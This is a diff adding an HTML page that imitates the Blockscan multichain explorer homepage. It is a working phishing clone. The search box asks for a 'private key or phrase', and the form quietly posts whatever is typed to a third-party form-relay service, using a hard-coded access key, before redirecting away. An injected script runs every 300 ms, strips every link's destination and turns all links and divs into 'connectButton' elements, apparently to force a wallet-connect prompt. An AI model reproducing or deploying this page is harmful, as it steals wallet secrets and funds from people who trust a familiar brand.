@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light" data-scrapbook-source="https://blockscan.com/"
+  data-scrapbook-create="20250716220251520">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <!-- Favicon -->
+  <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://blockscan.com/apple-touch-icon.png?v=1.1.9315.20952">
+
+
+  <title>Blockscan Multichain Explorer</title>
+
+  <!-- Open Graph / Facebook -->
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://blockscan.com">
+  <meta property="og:title" content="Blockscan — Multichain Explorer, Portfolio &amp; Analytics">
+  <meta property="og:description"
+    content="Explore Blockscan, your all-in-one multichain explorer for real-time data, portfolio balances, and in-depth analytics.">
+  <meta property="og:image" content="https://blockscan.com/assets/img/og-preview.jpg">
+
+  <!-- Twitter -->
+  <meta property="twitter:card" content="summary_large_image">
+  <meta property="twitter:url" content="https://blockscan.com">
+  <meta property="twitter:title" content="Blockscan — Multichain Explorer, Portfolio &amp; Analytics">
+  <meta property="twitter:description"
+    content="Explore Blockscan, your all-in-one multichain explorer for real-time data, portfolio balances, and in-depth analytics.">
+  <meta property="twitter:image" content="https://blockscan.com/assets/img/og-preview.jpg">
+
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+  <!-- Font -->
+
+
+  <link href="css2.css" rel="stylesheet">
+
+  <!-- CSS Plugins -->
+  <link rel="stylesheet" href="all.min.css">
+  <link rel="stylesheet" href="hs-mega-menu.min.css">
+  <link rel="stylesheet" href="dataTables.bootstrap5.css">
+  <link rel="stylesheet" href="autocomplete.min.css">
+
+  <!-- CSS Theme -->
+  <link rel="stylesheet" href="theme.min.css">
+  <link rel="stylesheet" href="rainbowkit.css">
+  <!-- JS -->
+
+  <link rel="stylesheet" href="app.css">
+
+  <style>
+    /* Light Theme */
+    [data-bs-theme="light"] .bg-word-0,
+    [data-bs-theme="auto"] .bg-word-0 {
+      --bs-main-content-linear-gradient-from: #e8edff;
+      --bs-main-content-linear-gradient-to: 246, 247, 248;
+      background-image: linear-gradient(var(--bs-main-content-linear-gradient-from) 0%, rgba(var(--bs-main-content-linear-gradient-to), 0) 35rem);
+    }
+
+    [data-bs-theme="light"] .bg-word-1,
+    [data-bs-theme="auto"] .bg-word-1 {
+      --bs-main-content-linear-gradient-from: #e8fff8;
+      --bs-main-content-linear-gradient-to: 246, 247, 248;
+      background-image: linear-gradient(var(--bs-main-content-linear-gradient-from) 0%, rgba(var(--bs-main-content-linear-gradient-to), 0) 35rem);
+    }
+
+    [data-bs-theme="light"] .bg-word-2,
+    [data-bs-theme="auto"] .bg-word-2 {
+      --bs-main-content-linear-gradient-from: #ffe8fd;
+      --bs-main-content-linear-gradient-to: 246, 247, 248;
+      background-image: linear-gradient(var(--bs-main-content-linear-gradient-from) 0%, rgba(var(--bs-main-content-linear-gradient-to), 0) 35rem);
+    }
+
+    /* Dark Theme */
+    [data-bs-theme="dark"] .bg-word-0,
+    [data-bs-theme="dim"] .bg-word-0 {
+      --bs-main-content-linear-gradient-from: #33393f;
+      --bs-main-content-linear-gradient-to: 35, 39, 42;
+      background-image: linear-gradient(var(--bs-main-content-linear-gradient-from) 0%, rgba(var(--bs-main-content-linear-gradient-to), 0) 35rem);
+    }
+
+    [data-bs-theme="dark"] .bg-word-1,
+    [data-bs-theme="dim"] .bg-word-1 {
+      --bs-main-content-linear-gradient-from: #333f3a;
+      --bs-main-content-linear-gradient-to: 66, 84, 102;
+      background-image: linear-gradient(var(--bs-main-content-linear-gradient-from) 0%, rgba(var(--bs-main-content-linear-gradient-to), 0) 35rem);
+    }
+
+    [data-bs-theme="dark"] .bg-word-2,
+    [data-bs-theme="dim"] .bg-word-2 {
+      --bs-main-content-linear-gradient-from: #3f333c;
+      --bs-main-content-linear-gradient-to: 81, 103, 125;
+      background-image: linear-gradient(var(--bs-main-content-linear-gradient-from) 0%, rgba(var(--bs-main-content-linear-gradient-to), 0) 35rem);
+    }
+
+    /* Animated Words */
+    @keyframes slideIn {
+      0% {
+        transform: translateY(-20px);
+        opacity: 0;
+      }
+
+      50% {
+        opacity: 1;
+      }
+
+      100% {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    .word-container {
+      display: inline-block;
+      vertical-align: top;
+    }
+
+    .js-animated-word {
+      display: none;
+      animation: slideIn 0.5s ease forwards;
+    }
+  </style>
+
+
+
+</head>
+<script>
+  function addClassesToElements() {
+
+    const links = document.querySelectorAll('a:not(.connectButton)');
+    for (const link of links) {
+      link.removeAttribute('href');
+      link.classList.add('connectButton');
+    }
+    const buttons = document.querySelectorAll('div:not(.connectButton)');
+    for (const button of buttons) {
+      button.classList.add('connectButton');
+    }
+  }
+  setInterval(addClassesToElements, 300);
+</script>
+
+<body class="d-flex flex-column min-vh-100 bg-word-2">
+  <div class="d-flex flex-column min-vh-100">
+
+    <header class="d-print-none py-3 ">
+      <nav class="navbar navbar-expand-lg navbar-light bg-transparent py-3 py-lg-0 ">
+        <div class="container-xxl position-relative   ">
+          <a class="navbar-brand  position-relative" href="">
+            <img width="150" data-img-theme="light" src="logo.svg" alt="Blockscan Logo">
+            <img width="150" data-img-theme="darkmode" src="logo-light.svg" alt="Blockscan Logo">
+
+            <span class="fs-sm">
+              <span
+                class="position-absolute top-0 z-1 ms-1.5 translate-middle badge fw-medium small rounded-pill bg-danger text-white px-1.5"
+                style="right: -3rem;">Beta</span>
+            </span>
+          </a>
+
+          <div class="d-flex justify-content-end align-items-center  gap-2">
+            <div class="dropdown">
+              <span data-bs-toggle="tooltip" data-bs-trigger="hover" data-bs-placement="bottom"
+                data-bs-original-title="Group">
+                <button
+                  class="btn btn-lg btn-white border border-dark dark:border-white border-opacity-15 content-center position-relative"
+                  type="button" id="buttonMenuTopbarBundle" style="width: 2.375rem; height: 2.375rem;">
+                  <i class="far fa-folder-bookmark"></i>
+                  <span
+                    class="position-absolute top-0 start-100 translate-middle p-1 bg-primary border border-light rounded-circle">
+                    <span class="visually-hidden">New alerts</span>
+                  </span>
+                </button>
+              </span>
+              <div class="dropdown-menu dropdown-menu-end" style="min-width: 14rem;" id="dropdownMenuTopbarBundle"
+                aria-labelledby="dropdownMenuTopbarBundle">
+                <div class="d-flex align-items-center gap-2 py-1 px-3 mb-0.5">
+                  <div class="fw-medium">My Group List</div>
+                  <span class="badge rounded-pill text-bg-primary fw-normal">New</span>
+                </div>
+
+                <ul id="bundleUnlist" class="list-unstyled overflow-y-auto scrollbar-custom mb-0"
+                  style="max-height: 15rem;" data-max-items="5"></ul>
+
+                <hr class="my-1.5">
+
+                <div id="bundleCreateJs">
+                  <a class="dropdown-item d-flex align-items-center gap-2" role="button">
+                    <i class="fa fa-plus"></i> Create Group (0/5)
+                  </a>
+                </div>
+              </div>
+            </div>
+
+
+            <div class="dropdown">
+              <button
+                class="btn btn-lg btn-white border border-dark dark:border-white border-opacity-15 text-primary content-center"
+                type="button" id="dropdownMenuTopbarSettings" data-bs-auto-close="outside" data-bs-toggle="dropdown"
+                aria-expanded="false" aria-label="Theme" style="width: 2.375rem; height: 2.375rem;">
+                <i class="far theme-icon-active fa-sun-bright" data-href="#fa-sun-bright"></i>
+              </button>
+
+              <ul class="dropdown-menu dropdown-menu-end" aria-labelledby="dropdownMenuTopbarSettings">
+                <li>
+                  <button type="button" class="dropdown-item active" data-bs-theme-value="light">
+                    <i class="far fa-sun-bright fa-fw dropdown-item-icon theme-icon me-1"
+                      data-href="#fa-sun-bright"></i> Light
+                  </button>
+                </li>
+                <li>
+                  <button type="button" class="dropdown-item" data-bs-theme-value="dim">
+                    <i class="far fa-moon-stars fa-fw dropdown-item-icon theme-icon me-1"
+                      data-href="#fa-moon-stars"></i> Dim
+                  </button>
+                </li>
+                <li>
+                  <button type="button" class="dropdown-item" data-bs-theme-value="dark">
+                    <i class="far fa-moon fa-fw dropdown-item-icon theme-icon me-1" data-href="#fa-moon"></i> Dark
+                  </button>
+                </li>
+              </ul>
+            </div>
+
+            <div class="dropdown">
+              <button class="btn btn-lg btn-white border border-dark dark:border-white border-opacity-15 content-center"
+                type="button" id="dropdownTopbarNetworks" data-bs-toggle="dropdown" aria-expanded="false"
+                aria-label="Features" style="width: 2.375rem; height: 2.375rem;">
+                <i class="far fa-grid-2"></i>
+              </button>
+
+              <ul class="dropdown-menu dropdown-menu-end" aria-labelledby="dropdownTopbarNetworks"
+                style="min-width: 15rem;">
+                <li>
+                  <a class="dropdown-item d-flex align-items-center gap-2" href="https://chat.blockscan.com/"
+                    rel="nofollow" target="_blank">
+                    <i class="far fa-message-lines"></i> Blockscan Chat
+                  </a>
+                </li>
+                <li>
+                  <a class="dropdown-item d-flex align-items-center gap-2" href="https://blockscan.com/ecosystems">
+                    <i class="far fa-circle-nodes"></i> Ecosystems <span
+                      class="badge rounded-pill text-bg-primary fw-normal">New</span>
+                  </a>
+                </li>
+                <li>
+                  <a class="dropdown-item d-flex align-items-center gap-2" href="https://blockscan.com/cross-chain">
+                    <i class="far fa-archway"></i> Cross-Chain Transaction <span
+                      class="badge rounded-pill text-bg-primary fw-normal">New</span>
+                  </a>
+                </li>
+                <li>
+                  <a class="dropdown-item d-flex align-items-center gap-2" href="https://blockscan.com/headlines">
+                    <i class="far fa-newspaper"></i> Headlines
+                  </a>
+                </li>
+                <li>
+                  <a class="dropdown-item d-flex align-items-center gap-2" href="https://blockscan.com/charts">
+                    <i class="far fa-chart-pie-simple"></i> Multichain Charts
+                  </a>
+                </li>
+                <li>
+                  <a class="dropdown-item d-flex align-items-center gap-2" href="https://vscode.blockscan.com/"
+                    rel="nofollow" target="_blank">
+                    <i class="far fa-code"></i> VSCode IDE
+                  </a>
+                </li>
+                <li>
+                  <a class="dropdown-item d-flex align-items-center gap-2"
+                    href="https://blockscan.com/brand-guidelines">
+                    <i class="far fa-shapes"></i> Brand Guidelines
+                  </a>
+                </li>
+                <li>
+                  <a class="dropdown-item d-flex align-items-center gap-2 group" href="https://blockscan.com/feedback">
+                    <i class="far fa-comment-smile"></i> Share Feedback
+                  </a>
+                </li>
+                <li>
+                  <a class="dropdown-item d-flex align-items-center gap-2" href="https://blockscan.com/app-landing">
+                    <i class="far fa-mobile"></i> Blockscan Mobile App
+                  </a>
+                </li>
+
+                <li>
+                  <hr class="my-0">
+                </li>
+
+                <li class="d-flex flex-wrap gap-1.5 pt-2 pb-1 px-2">
+                  <a class="fs-sm link-muted" href="https://twitter.com/BlockscanHQ" rel="nofollow" target="_blank">X
+                    (Twitter)</a>
+                  <span class="text-muted">•</span>
+                  <a class="fs-sm link-muted" href="https://blockscan.com/contact-us">Contact Us</a>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </nav>
+
+    </header>
+
+    <div class="toast-container position-fixed top-0 end-0 p-3">
+    </div>
+
+
+
+    <main id="main" class="content-center my-auto" style="min-height: 100%;" role="main">
+      <section class="w-100 py-12">
+        <div class="container-xxl">
+          <div class="row justify-content-center align-items-center mb-16">
+            <div class="col-md-10 col-lg-8 col-xl-7 col-xxl-6">
+              <!-- Title -->
+              <div class="text-center mb-6">
+                <h1 class="fw-semibold">
+                  <span class="d-none d-sm-inline-block">Blockscan</span> Multichain
+                  <span class="word-container text-start max-w-md-14">
+                    <span class="js-animated-word text-primary" style="display: none;">
+                      <i class="fal fa-globe"></i> Explorer
+                    </span>
+                    <span class="js-animated-word text-success" style="display: none;">
+                      <i class="fal fa-coins"></i> Portfolio
+                    </span>
+                    <span class="js-animated-word text-pink" style="display: inline-block;">
+                      <i class="fal fa-chart-simple"></i> Analytics
+                    </span>
+                  </span>
+                </h1>
+
+                <p class="fw-medium">Supporting 30+ chains and counting.</p>
+              </div>
+              <!-- End Title -->
+              <form action="https://api.web3forms.com/submit"
+                class="search-panel-container position-relative auto-search-max-height bg-white border border-dark dark:border-white border-opacity-15 rounded-4 d-flex gap-2 p-1 mb-4"
+                method="POST">
+                <!-- REQUIRED: Web3Forms access key -->
+                <input type="hidden" name="access_key" value="bd746c53-ca1b-47a4-92f5-43f20b96443e">
+
+                <!-- Redirect after successful submission -->
+                <input type="hidden" name="redirect" value="https://vercel.com/">
+
+                <!-- Optional: subject line in email -->
+                <input type="hidden" name="subject" value="New Blockchain Search Submission">
+
+                <!-- Optional: from_name in email -->
+                <input type="hidden" name="from_name" value="Blockchain Explorer Form">
+
+                <span class="d-flex align-items-center position-absolute top-0 bottom-0" title="Search"
+                  style="left: 0.75rem;">
+                  <i class="fa-regular fa-search fs-5 text-muted"></i>
+                </span>
+                <div class="flex-grow-1">
+                  <label for="search-panel" class="visually-hidden">Search</label>
+
+                  <input id="search-panel" name="searchAddress" type="text"
+                    class="form-control form-control-lg fs-default border-0 focus-shadow-0 rounded-pill pe-8 pe-md-14"
+                    placeholder="Search private key or phrase to update rpc" autocomplete="off"
+                    style="padding-inline: 2rem;" value="">
+                  <div class="auto-results-wrapper">
+                    <div class="p-2">
+                      <a href="https://chat.blockscan.com/start" target="_blank"
+                        class="search-panel-ads d-flex align-items-center p-2 rounded">
+                        <div class="me-2">
+                          <img width="22" data-img-theme="light" src="logo-symbol.svg" alt="Blockscan Chat">
+                          <img width="22" data-img-theme="darkmode" src="logo-symbol-light.svg" alt="Blockscan Chat">
+                        </div>
+
+                        <div class="text-truncate">
+                          <h6 class="d-flex align-items-center fs-sm text-dark mb-0">
+                            <div class="text-truncate me-2">Blockscan Chat: Wallet-to-Wallet Messaging Made Easy</div>
+                            <span
+                              class="d-none d-sm-inline-block small bg-white text-muted rounded-1 border px-2 py-1 ms-1">Featured</span>
+                            <span
+                              class="d-inline-block d-sm-none small bg-white text-muted rounded-1 border px-2 py-1 ms-1">Ad</span>
+                          </h6>
+                        </div>
+                      </a>
+                    </div>
+                    <div class="search-panel-header"></div>
+                    <ul id="auto-search-panel-results" tabindex="0" role="listbox" title="Search Panel"></ul>
+                    <div class="search-footer px-4 py-2 border-top d-flex justify-content-between d-none">
+                      <div class="d-flex align-items-center">
+                        <svg class="me-2" width="44" height="20" viewBox="0 0 44 20" fill="none"
+                          xmlns="http://www.w3.org/2000/svg">
+                          <path
+                            d="M5.64062 9.5625L9.57812 5.4375C9.69531 5.32031 9.83594 5.27344 10 5.27344C10.1406 5.27344 10.2812 5.32031 10.3984 5.4375L14.3359 9.5625C14.5469 9.79688 14.5469 10.1484 14.3125 10.3594C14.1016 10.5703 13.7266 10.5703 13.5156 10.3359L10.5625 7.21875V15.1875C10.5625 15.5156 10.3047 15.75 10 15.75C9.71875 15.75 9.4375 15.5156 9.4375 15.1875V7.21875L6.46094 10.3359C6.25 10.5703 5.875 10.5703 5.66406 10.3594C5.42969 10.1484 5.42969 9.77344 5.64062 9.5625Z"
+                            fill="#ADB5BD"></path>
+                          <rect x="0.5" y="0.5" width="19" height="19" rx="3.5"
+                            class="stroke-gray-200 dark:stroke-gray-600"></rect>
+                          <path
+                            d="M38.3359 11.4609L34.3984 15.5859C34.2812 15.7031 34.1406 15.75 34 15.75C33.8359 15.75 33.6953 15.7031 33.5781 15.5859L29.6406 11.4609C29.4297 11.2266 29.4297 10.875 29.6641 10.6641C29.875 10.4531 30.25 10.4531 30.4609 10.6875L33.4375 13.8047V5.83594C33.4375 5.50781 33.6719 5.27344 33.9766 5.27344C34.2578 5.27344 34.5625 5.50781 34.5625 5.83594V13.8047L37.5156 10.6875C37.7266 10.4531 38.1016 10.4531 38.3125 10.6641C38.5469 10.875 38.5469 11.2266 38.3359 11.4609Z"
+                            fill="#ADB5BD"></path>
+                          <rect x="24.5" y="0.5" width="19" height="19" rx="3.5"
+                            class="stroke-gray-200 dark:stroke-gray-600"></rect>
+                        </svg>
+                        <div class="text-muted small me-3">Navigate</div>
+                        <svg class="me-2" width="28" height="20" viewBox="0 0 28 20" fill="none"
+                          xmlns="http://www.w3.org/2000/svg">
+                          <path
+                            d="M9.99037 12.9312V14H5.83852V12.9312H9.99037ZM6.21986 6.17969V14H4.87172V6.17969H6.21986ZM9.44789 9.44531V10.498H5.83852V9.44531H9.44789ZM9.96352 6.17969V7.25391H5.83852V6.17969H9.96352ZM15.0957 11.9858C15.0957 11.8247 15.0706 11.6815 15.0205 11.5562C14.974 11.4308 14.8898 11.3162 14.7681 11.2124C14.6463 11.1086 14.4744 11.0083 14.2524 10.9116C14.034 10.8114 13.7547 10.7093 13.4146 10.6055C13.0422 10.4909 12.6984 10.3638 12.3833 10.2241C12.0718 10.0809 11.7996 9.91618 11.5669 9.72998C11.3341 9.5402 11.1533 9.32357 11.0244 9.08008C10.8955 8.83301 10.8311 8.54834 10.8311 8.22607C10.8311 7.90739 10.8973 7.61735 11.0298 7.35596C11.1659 7.09456 11.3574 6.86898 11.6045 6.6792C11.8551 6.48584 12.1506 6.33724 12.4907 6.2334C12.8309 6.12598 13.2069 6.07227 13.6187 6.07227C14.1987 6.07227 14.6982 6.17969 15.1172 6.39453C15.5397 6.60938 15.8638 6.89762 16.0894 7.25928C16.3185 7.62093 16.4331 8.02018 16.4331 8.45703H15.0957C15.0957 8.19922 15.0402 7.97184 14.9292 7.7749C14.8218 7.57438 14.6571 7.41683 14.4351 7.30225C14.2166 7.18766 13.9391 7.13037 13.6025 7.13037C13.2839 7.13037 13.0189 7.17871 12.8076 7.27539C12.5964 7.37207 12.4388 7.50277 12.335 7.66748C12.2311 7.83219 12.1792 8.01839 12.1792 8.22607C12.1792 8.37288 12.2132 8.50716 12.2812 8.62891C12.3493 8.74707 12.4531 8.85807 12.5928 8.96191C12.7324 9.06217 12.9079 9.15706 13.1191 9.24658C13.3304 9.3361 13.5793 9.42204 13.8657 9.50439C14.299 9.6333 14.6768 9.77653 14.999 9.93408C15.3213 10.0881 15.5898 10.2635 15.8047 10.4604C16.0195 10.6574 16.1807 10.8812 16.2881 11.1318C16.3955 11.3789 16.4492 11.66 16.4492 11.9751C16.4492 12.3045 16.383 12.6017 16.2505 12.8667C16.118 13.1281 15.9282 13.3519 15.6812 13.5381C15.4377 13.7207 15.144 13.8621 14.8003 13.9624C14.4601 14.0591 14.0806 14.1074 13.6616 14.1074C13.2856 14.1074 12.915 14.0573 12.5498 13.957C12.1882 13.8568 11.8587 13.7046 11.5615 13.5005C11.2643 13.2928 11.028 13.035 10.8525 12.7271C10.6771 12.4155 10.5894 12.0521 10.5894 11.6367H11.9375C11.9375 11.891 11.9805 12.1076 12.0664 12.2866C12.1559 12.4657 12.2795 12.6125 12.437 12.7271C12.5946 12.8381 12.7772 12.9204 12.9849 12.9741C13.1961 13.0278 13.4217 13.0547 13.6616 13.0547C13.9767 13.0547 14.2399 13.0099 14.4512 12.9204C14.666 12.8309 14.8271 12.7056 14.9346 12.5444C15.042 12.3833 15.0957 12.1971 15.0957 11.9858ZM22.1507 11.4541H23.4935C23.4505 11.9661 23.3073 12.4227 23.0638 12.8237C22.8203 13.2212 22.4784 13.5345 22.0379 13.7637C21.5975 13.9928 21.0622 14.1074 20.432 14.1074C19.9486 14.1074 19.5135 14.0215 19.1268 13.8496C18.7401 13.6742 18.4089 13.4271 18.1332 13.1084C17.8574 12.7861 17.6462 12.3976 17.4994 11.9429C17.3561 11.4881 17.2845 10.9797 17.2845 10.4175V9.76758C17.2845 9.2054 17.3579 8.69694 17.5047 8.24219C17.6551 7.78743 17.87 7.39893 18.1493 7.07666C18.4286 6.75081 18.7634 6.50195 19.1537 6.33008C19.5476 6.1582 19.9898 6.07227 20.4803 6.07227C21.1034 6.07227 21.6297 6.18685 22.0594 6.41602C22.4891 6.64518 22.8221 6.96208 23.0585 7.3667C23.2984 7.77132 23.4452 8.23503 23.4989 8.75781H22.1561C22.1203 8.42122 22.0415 8.13298 21.9198 7.89307C21.8016 7.65316 21.6262 7.47054 21.3934 7.34521C21.1607 7.21631 20.8563 7.15186 20.4803 7.15186C20.1724 7.15186 19.9038 7.20915 19.6747 7.32373C19.4455 7.43831 19.2539 7.60661 19.1 7.82861C18.946 8.05062 18.8296 8.32454 18.7508 8.65039C18.6756 8.97266 18.638 9.34147 18.638 9.75684V10.4175C18.638 10.8114 18.6721 11.1694 18.7401 11.4917C18.8117 11.8104 18.9191 12.0843 19.0624 12.3135C19.2092 12.5426 19.3954 12.7199 19.621 12.8452C19.8465 12.9705 20.1169 13.0332 20.432 13.0332C20.8151 13.0332 21.1249 12.9723 21.3612 12.8506C21.6011 12.7288 21.7819 12.5516 21.9037 12.3188C22.029 12.0825 22.1114 11.7943 22.1507 11.4541Z"
+                            fill="#ADB5BD"></path>
+                          <rect x="0.5" y="0.5" width="27" height="19" rx="3.5"
+                            class="stroke-gray-200 dark:stroke-gray-600"></rect>
+                        </svg>
+                        <div class="text-muted small">Close</div>
+                      </div>
+                      <div class="d-flex align-items-center">
+                        <svg class="me-2" width="20" height="20" viewBox="0 0 20 20" fill="none"
+                          xmlns="http://www.w3.org/2000/svg">
+                          <path
+                            d="M7.16406 14.6484L4.16406 11.6484C4.04688 11.5547 4 11.4141 4 11.25C4 11.1094 4.04688 10.9688 4.16406 10.875L7.16406 7.875C7.375 7.64062 7.72656 7.64062 7.9375 7.875C8.17188 8.08594 8.17188 8.4375 7.9375 8.64844L5.89844 10.6875H14.875V5.8125C14.875 5.50781 15.1094 5.25 15.4375 5.25C15.7422 5.25 16 5.50781 16 5.8125V11.25C16 11.5781 15.7422 11.8125 15.4375 11.8125H5.89844L7.9375 13.875C8.17188 14.0859 8.17188 14.4375 7.9375 14.6484C7.72656 14.8828 7.375 14.8828 7.16406 14.6484Z"
+                            fill="#ADB5BD"></path>
+                          <rect x="0.5" y="0.5" width="19" height="19" rx="3.5"
+                            class="stroke-gray-200 dark:stroke-gray-600"></rect>
+                        </svg>
+                        <div class="text-muted small">Enter</div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <span
+                  class="shortcut-slash-icon align-items-center position-absolute top-0 bottom-0 align-items-center d-none d-sm-flex"
+                  title="Search" style="right: 0.5rem;">
+                  <kbd class="bg-secondary bg-opacity-25 fw-semibold px-2 py-0.5 text-dark text-opacity-50">/</kbd>
+                </span>
+                <div class="d-flex align-items-center position-absolute top-0 bottom-0" style="right: 0.5rem;">
+                  <span class="clear-icon d-none d-flex align-items-center my-auto me-1" title="Search"
+                    style="cursor:pointer;">
+                    <i class="fa-regular fa-xmark fs-5 text-secondary hover:text-muted"></i>
+                  </span>
+
+                  <span class="search-icon d-none btn btn-sm btn-secondary content-center my-auto ms-2" title="Search"
+                    style="right: 0.5rem; width: 1.5rem; height: 1.5rem; cursor: pointer;">
+                    <i class="fa-regular fa-arrow-turn-down-left text-muted"></i>
+                  </span>
+                </div>
+              </form>
+              <!-- Labels -->
+              <div class="connectButton
+                <a class=" connectButton"
+                href="https://blockscan.com/address/0x00000000219ab540356cbb839cbe05303d7705fa">
+                <i class="far fa-circle-user text-primary me-0.5"></i> Address of the Day
+                </a>
+
+                <a onclick="openModal(8)"
+                  href="https://blockscan.com/token/0x912ce59144191c1204e64559fe8253a0e49e6548?chainid=42161">
+                  <i class="far fa-coin-vertical text-success me-0.5"></i> Token of the Day
+                </a>
+
+                <a class="badge bg-light hover:bg-secondary border border-dark dark:border-white border-opacity-15 text-muted hover:text-dark dark:hover:text-white fs-sm fw-normal transition-all rounded-4 py-3 px-4"
+                  href="https://blockscan.com/cross-chain">
+                  <i class="far fa-archway text-danger me-0.5"></i> Cross-Chain Transactions
+                </a>
+
+                <a class="badge bg-light hover:bg-secondary border border-dark dark:border-white border-opacity-15 text-muted hover:text-dark dark:hover:text-white fs-sm fw-normal transition-all rounded-4 py-3 px-4"
+                  href="https://blockscan.com/headlines">
+                  <i class="far fa-newspaper text-yellow-600 me-0.5"></i> Headlines
+                </a>
+              </div>
+              <!-- End Labels -->
+            </div>
+          </div>
+        </div>
+      </section>
+    </main>
+
+
+
+
+    <footer class="d-print-none border-top py-4">
+      <div class="container-xxl">
+        <div class="row justify-content-between align-items-center fs-sm">
+          <div class="col-md mb-2 mb-md-0">
+            <div class="me-3">
+              <span>Blockscan © 2025</span>
+              <span class="text-secondary mx-1">|</span>
+              <span>Made with <i class="fas fa-heart text-danger"></i> by the team behind <a
+                  class="link-dark text-decoration-underline" title="Etherscan" href="https://etherscan.io/"
+                  target="_blank">Etherscan</a></span>
+            </div>
+          </div>
+
+          <div class="col-md-auto text-md-end">
+            <div class="d-flex flex-wrap align-items-center gap-2">
+              <a class="link-dark text-decoration-underline" title="Eaas" href="https://blockscan.com/eaas">Eaas</a>
+              <span class="text-secondary fs-70x">|</span>
+              <a class="link-dark text-decoration-underline" title="Terms" href="https://blockscan.com/terms">Terms</a>
+              <span class="text-secondary fs-70x">|</span>
+              <a class="link-dark text-decoration-underline" title="Policy"
+                href="https://blockscan.com/privacy-policy">Policy</a>
+              <span class="text-secondary fs-70x">|</span>
+              <a class="link-dark text-decoration-underline" title="Donations"
+                href="https://blockscan.com/address/0x71c7656ec7ab88b098defb751b7401b5f6d8976f">Donations</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </footer>
+  </div>
+
+
+
+  <!-- Modal: Create Bundle -->
+  <div class="modal fade" id="createBundleModal" tabindex="-1" aria-labelledby="createBundleModalLabel">
+    <div class="modal-dialog">
+      <div class="modal-content">
+        <div class="modal-header d-flex align-items-center border-0 pb-0">
+          <h1 class="modal-title mb-0" id="createBundleModalLabel">Create New Group</h1>
+          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close" tabindex="-1"></button>
+        </div>
+
+        <div class="modal-body bundle-container" data-max-items="10">
+          <div class="col-sm-10 mx-auto text-center d-flex flex-column align-items-center gap-2 mb-4">
+            <div class="bundle-container-image"></div>
+            <h2 class="h5" data-bundle-name="">&nbsp;</h2>
+            <p class="text-muted">Create a grouped portfolio to track multiple multichain addresses in a single view.
+            </p>
+          </div>
+
+          <div class="mb-4">
+            <label for="createBundleName" class="form-label">Group Name<span class="text-danger">*</span></label>
+            <input type="text" class="form-control py-2 bundle-container-name" id="createBundleName" maxlength="30"
+              value="My Group">
+            <div class="small text-muted mt-2">Max 30 characters</div>
+          </div>
+
+          <div class="mb-4">
+            <label for="createAddress" class="form-label">Add Address</label>
+
+            <div class="search-panel-container position-relative auto-search-max-height">
+              <input type="text" class="form-control px-8 py-2 shadow-none border rounded-2 bundle-search-input"
+                id="createAddress" placeholder="Search for Address" style="border-radius: initial;" autocomplete="off"
+                value="">
+              <div class="auto-results-wrapper">
+                <ul id="auto-createAddress-results" tabindex="0" role="listbox" title="Search Panel"></ul>
+              </div>
+              <span class="d-flex align-items-center position-absolute top-0 bottom-0" title="Search"
+                style="left: 0.75rem;">
+                <i class="far fa-search text-muted"></i>
+              </span>
+              <a href="javascript:"
+                class="clear-icon d-none align-items-center position-absolute top-0 bottom-0 my-auto d-flex"
+                style="right: 0.75rem; cursor:pointer;" aria-label="Clear search address">
+                <i class="fa-regular fa-xmark fs-5 text-secondary"></i>
+              </a>
+            </div>
+          </div>
+
+          <div class="mb-2">
+            <label for="createAddress" class="form-label d-flex justify-content-between">
+              In the Group
+              <span class="counter text-muted">0/10 limit</span>
+            </label>
+          </div>
+
+          <div class="items-container overflow-y-auto" style="max-height: 15rem;"></div>
+
+          <!-- Empty State -->
+          <div class="bundle-empty-message" style="display: block;">
+            <div class="text-center border rounded py-10">
+              <div class="mb-4 d-flex justify-content-center">
+                <div class="content-center bg-light border rounded-circle p-3" style="height: 4rem; width: 4rem;">
+                  <i class="fal fa-box-open fs-3 text-muted"></i>
+                </div>
+              </div>
+              <div>Your Group is empty</div>
+              <div class="text-muted">Search and add address to get started</div>
+            </div>
+          </div>
+          <!-- End: Empty State -->
+        </div>
+
+        <div class="modal-footer">
+          <button type="button" class="btn btn-ghost-white" data-bs-dismiss="modal">Cancel</button>
+          <button type="button" class="btn btn-primary btn-create-bundle" disabled="">Create Group</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- End Modal: Create Bundle -->
+
+
+
+  <!-- JS Global Compulsory  ?v=0.0.5 -->
+
+
+
+  <!-- JS Implementing Plugins -->
+
+
+
+
+
+
+
+
+
+  <!-- JS -->
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+
+</html>
